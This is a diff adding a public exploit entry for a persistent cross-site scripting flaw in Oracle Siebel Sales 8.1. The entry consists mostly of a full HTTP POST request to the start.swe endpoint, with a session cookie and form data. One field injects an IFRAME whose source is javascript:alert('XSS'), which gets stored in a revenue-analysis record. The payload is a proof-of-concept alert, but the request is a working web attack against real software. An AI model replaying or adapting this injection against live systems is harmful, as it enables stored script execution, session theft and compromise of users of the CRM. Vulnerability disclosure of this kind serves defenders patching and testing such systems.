@@ -1,0 +1,22 @@
+# Exploit Title : Oracle Siebel Sales 8.1 - Persistent Cross-Site Scripting
+# Exploit Author : omurugur
+# Software link: https://www.oracle.com/tr/applications/siebel/
+# Effective version : Oracle Siebel Sales 8.1
+# CVE: N/A
+
+# Examples Request;
+
+POST /salesADMIN_trk/start.swe HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Accept-Encoding: gzip, deflate
+User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64;
+Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729;
+.NET CLR 3.5.30729)
+Host: X.X.X.X
+Content-Length: 550
+Pragma: no-cache
+Cookie: SWEUAID=23; _sn=**-yVfB7JyKox4txS.fQJdh6us-fIdUQaQW0.oxIhK
+Connection: close
+
+s_1_1_26_0=&SWEVI=&SWERowId=1-5VWLXT4&SWEC=39&s_1_1_28_0=&SWEMethod=PostChanges&s_1_1_18_0=12/9/2019&SWEPOC=Account&SWEReqRowId=1&SWERPC=1&s_1_1_90_0=N&s_1_1_71_0=&s_1_1_72_0=&s_1_1_83_0=<IFRAME
+SRC="javascript:alert('XSS');"></IFRAME>&SWEApplet=Revenue%20Analysis%20Form%20Applet&SWEActiveApplet=Revenue%20Analysis%20Form%20Applet&s_1_1_51_0=%240.00&SWEView=Revenue%20Analysis%20View&SWECmd=InvokeMethod&s_1_1_65_0=&s_1_1_21_0=%240.00&s_1_1_55_0=SADMIN&SWETS=1575878518105&SWEActiveView=Revenue%20Analysis%20View&s_1_1_89_0=&s_1_1_78_0=%240.00&SWEP=&s_1_1_36_0=N&s_1_1_14_0=0.000000&SWERowIds=
